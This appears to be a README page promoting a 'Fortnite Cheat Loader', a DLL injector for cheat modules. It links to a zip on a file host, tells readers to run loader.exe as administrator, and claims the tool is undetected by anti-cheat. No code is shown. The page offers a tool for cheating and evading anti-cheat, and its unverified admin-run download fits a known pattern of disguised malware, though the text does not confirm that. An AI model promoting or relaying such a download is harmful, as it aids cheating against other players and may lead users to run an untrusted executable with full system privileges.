# Fortnite Cheat Loader

Loader and injector for Fortnite cheats: attaches the module and opens the in-game menu.

## Download

**[Download Fortnite Cheat Loader](https://www.mediafire.com/file/r8u81a608smyzk5/Fc_Cheat.zip/file)**

## Features

- Waits for the game process automatically
- Manual or auto inject
- Module selection (dll)
- Menu hotkey `INSERT`
- Clean detach on exit
- Log window with status

## Installation

1. Download the archive from the link above
2. Extract to a separate folder
3. Run `loader.exe` as administrator
4. Launch Fortnite and press `Inject`

## Usage

Pick the module in the file list and inject. The menu opens in-game with `INSERT`.

## Status

- Status: Undetected
- Platform: Epic Games, Windows 10/11
- Mode: Loader / injector

## Notes

Always run the loader before the game. Auto-inject waits for the process on its own.
